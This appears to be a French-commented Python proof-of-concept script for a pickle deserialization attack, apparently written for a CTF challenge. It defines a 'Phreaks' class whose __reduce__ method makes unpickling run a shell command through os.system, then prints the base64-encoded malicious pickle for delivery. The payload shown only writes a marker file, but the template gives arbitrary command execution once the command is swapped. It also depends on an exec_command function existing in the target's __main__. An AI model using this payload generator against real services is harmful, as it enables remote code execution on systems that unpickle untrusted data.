import pickle
import base64

# Classe Phreaks (utilisée de manière malveillante)
class Phreaks:
    def __init__(self, hacker_handle, category, id):
        self.hacker_handle = hacker_handle
        self.category = category
        self.id = id
    
    def __reduce__(self):
        cmd = ('echo "Vulnérabilité exploitée" > vuln.txt')
        return __import__('__main__').exec_command, (cmd,)

# Définition de la fonction exec_command dans le module __main__
def exec_command(cmd):
    return __import__('os').system(cmd)

# Sérialisation de l'objet malveillant
obj_malveillant = Phreaks('Skrill', 'Rev', 12345)
obj_pickled = pickle.dumps(obj_malveillant)
encoded_obj = base64.b64encode(obj_pickled)

# Affichage de l'objet Pickle encodé pour le POC
print("Objet Pickle encodé pour le POC :", encoded_obj)
